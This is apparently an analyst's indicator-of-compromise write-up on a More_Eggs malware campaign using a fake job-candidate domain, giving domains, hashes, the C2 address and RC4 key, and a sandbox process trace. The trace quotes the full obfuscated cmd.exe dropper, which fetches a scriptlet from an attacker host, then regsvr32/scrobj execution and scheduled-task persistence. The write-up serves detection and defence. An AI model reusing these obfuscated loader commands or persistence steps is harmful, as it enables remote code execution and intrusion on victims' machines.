@@ -1,0 +1,110 @@
+More_Eggs | davidlesnick  | June 2025
+
+---------------------------------------------------------------
+IOCs
+---------------------------------------------------------------
+
+Candidate Domain
+http://davidlesnick.com
+davidlesnick.com
+
+LNK Payload
+http://ss.davidlesnick.com/kashfvl4
+13.60.41.171:80
+
+Zip Download
+https://9bf31c7f.davidlesnick.com/req/31373/1190919800
+
+More_Eggs C2
+https://lezkink.com/id/243149
+
+SHA256s
+0cdaa9ff7bf713b650b9b3378239b3100674f4f7a9508e7ab3c0450929107e34
+ac3977ea4bc7931aca6a31e44257e8958baac493c74ca5fa43f5952f0bebb551
+a01effd79584e54695fa64d9ba1c01ee8018c26175a8d86d8d7cb3812c188b0a
+29840e3f5573d05bd20a2748c6a5deadc3998d552ac969655f5c0b1508c33fda
+108e0ca4461d95a0fcd0543388bf8c74d60c19b654072429a5f920002aabec2b
+e13c3ff103a170306f62a988c63b58edb44116f28e56be9cfc5e1000f394d507
+
+---------------------------------------------------------------
+Details
+---------------------------------------------------------------
+
+LNK
+
+C:\Windows\system32\cmd.exe
+cmd /c "C:\Users\Admin\AppData\Local\Temp\David - Lesnick.lnk"
+PID:1780
+C:\Windows\System32\cmd.exe
+"C:\Windows\System32\cmd.exe" /v /c set "Domain=et" && s!Domain! "Evolve=e" && s!Domain! "Puzzles=version" && s!Domain! "Visual=t" && s!Domain! "Clean=settings" && s!Domain! "Losses=default" && s!Domain! "Match=a" && s!Domain! "Prison=." && s!Domain! "Kangaroo=ni" && s!Domain! "Organ=a" && s!Domain! "Queries=si" && s!Domain! "Paintings=star" && call s!Domain! "Urban=%Paintings:~0,1%" && s!Domain! "Indicators=$win" && s!Domain! "Impose=c" && s!Domain! "Second=d" && s!Domain! "Instances=ure = " && !Urban!et "Bears=!Prison!inf" && !Urban!et "Revenues=ieui!Kangaroo!t!Bears!" && c!Organ!ll !Urban!et "Chess=%t!Evolve!mp%\" && s!Evolve!t "Regions=!Chess!!Revenues!" && (for /D %g in ("[!Puzzles!]" "signat!Instances!!Indicators!dows nt$" "[s!Visual!ring!Urban!]" "Stone=/" "Brush=%time%" "!Urban!hortsvcn!Match!me=' '" "Garden=h" "!Urban!ervicen!Match!me=' '" "Detect=com" "Effectiveness=b;Harris" "Chairs=t;Nature" "Meetings=:;Chapter" "Performs=i!Kangaroo!t" "[6CB]" "sc\" "ro%Effectiveness%j,NI,%Garden%%Chairs%%Chairs%p%Meetings%%Stone%%Stone%ss!Prison!davidlesnick!Prison!%Detect%/kashfvl4" "[CB488]" "ieu%Performs%!Bears!" "[!Second!e!Urban!tinationdirs]" "CB488=01" "!Losses!destdir=11" "[!Losses!in!Urban!tall.windows7]" "!Second!elfil!Evolve!s=CB488" "Un\" "Register\" "OCXs=6CB" ) do @echo %~g)>"!Regions!" && !Urban!et "Tomato=ie4ui!Kangaroo!t.!Evolve!xe" && !Impose!all x!Impose!opy /Y /C /Q %win!Second!ir%\!Urban!ys!Visual!!Evolve!m32\!Tomato! "!Chess!*" && !Paintings!t "" wmi!Impose! proce!Urban!s call !Impose!r!Evolve!a!Visual!!Evolve! "!Chess!!Tomato! -base!Clean!" && !Paintings!t "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
+PID:2228
+C:\Windows\system32\xcopy.exe
+xcopy  /Y /C /Q C:\Windows\system32\ie4uinit.exe "C:\Users\Admin\AppData\Local\Temp\*" 
+PID:2012
+C:\Windows\System32\Wbem\WMIC.exe
+wmic  process call create "C:\Users\Admin\AppData\Local\Temp\ie4uinit.exe -basesettings" 
+PID:5004
+C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" 
+PID:5124
+C:\Users\Admin\AppData\Local\Temp\ie4uinit.exe
+C:\Users\Admin\AppData\Local\Temp\ie4uinit.exe -basesettings
+PID:3988
+C:\Users\Admin\AppData\Local\Temp\ie4uinit.exe
+C:\Users\Admin\AppData\Local\Temp\ie4uinit.exe -ClearIconCache
+PID:5964
+C:\Windows\system32\RunDll32.exe
+C:\Windows\system32\RunDll32.exe C:\Windows\system32\migration\WininetPlugin.dll,MigrateCacheForUser /m /0
+PID:1028
+C:\Windows\system32\RunDll32.exe
+C:\Windows\system32\RunDll32.exe C:\Windows\system32\migration\WininetPlugin.dll,MigrateCacheForUser /m /0
+
+
+Scriptlet
+
+regsvr32.exe /s /n /u /i:"C:\Users\Admin\AppData\Local\Temp\kashfvl4" scrobj.dll
+services.exe signed C:\Windows\system32\services.exe
+svchost.exe signed C:\Windows\system32\svchost.exe -k DcomLaunch
+WmiPrvSE.exe C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+regsvr32.exe regsvr32 /s /n /i:Kill "C:\Users\Admin\AppData\Roaming\Adobe\8668.dll"
+regsvr32.exe /s /n /i:Kill "C:\Users\Admin\AppData\Roaming\Adobe\8668.dll"
+schtasks.exe /Delete /F /TN "93EEF0843"
+schtasks.exe /Create /TN "93EEF0843" /XML "C:\ProgramData\Adobe\04A841D3F4FB03D.txt"
+cmd.exe /v /c set "nfgfzdk719=dialogs" && call set "nfgfzdk958=%nfgfzdk719:~6,1%" && !nfgfzdk958!et "nfgfzdk282=d" && c!nfgfzdk282! /!nfgfzdk282!"C:\Users\Admin\AppData\Roaming\Adobe\" && !nfgfzdk282!el "8668.dll"
+WmiPrvSE.exe C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+msxsl.exe signed more_eggs E3E17DA682.txt E3E17DA682.txt
+typeperf.exe typeperf.exe "\System\Processor Queue Length" -si 1 -sc 1
+typeperf.exe typeperf.exe "\System\Processor Queue Length" -si 1 -sc 1
+WmiPrvSE.exe C:\Windows\system32\wbem\wmiprvse.exe -Embedding
+svchost.exe signed C:\Windows\system32\svchost.exe -k netsvcs
+WMIADAP.exe wmiadap.exe /R /T
+svchost.exe
+taskhostw.exe signed taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
+GoogleUpdate.exe signed /c
+cmd.exe C:\Windows\system32\cmD.EXE /v /c set "tqnogel278=updates" && call set "tqnogel66=%tqnogel278:~6,1%" && !tqnogel66!et "tqnogel14=t" && !tqnogel66!et "tqnogel112=i" && call !tqnogel66!tar!tqnogel14! "" ...(truncated)
+cscript.exe cscript -e:jscript F02E7E172252BF36331369E.txt
+msxsl.exe signed more_eggs E3E17DA682.txt E3E17DA682.txt
+taskhostw.exe signed taskhostw.exe
+taskhostw.exe signed taskhostw.exe
+svchost.exe signed C:\Windows\system32\svchost.exe -k netsvcs
+taskeng.exe taskeng.exe {E44C7B81-5913-4B05-9F6D-6796406AF967} S-1-5-18:NT AUTHORITY\System:Service:
+GoogleUpdate.exe signed /ua /installsource scheduler
+GoogleUpdate.exe signed /ua /installsource scheduler
+GoogleUpdate.exe signed /ua /installsource scheduler
+GoogleUpdate.exe signed /ua /installsource scheduler
+
+
+---------------------------------------------------------------
+Malware
+---------------------------------------------------------------
+More_Eggs
+
+C2: https://lezkink.com/id/243149
+Version: 6.7a
+RC4Key: CF8bjjs4e98dvKKfafahid3ijiafv
+
+---------------------------------------------------------------
+Samples
+---------------------------------------------------------------
+
+- https://tria.ge/250612-sypzrayzcw
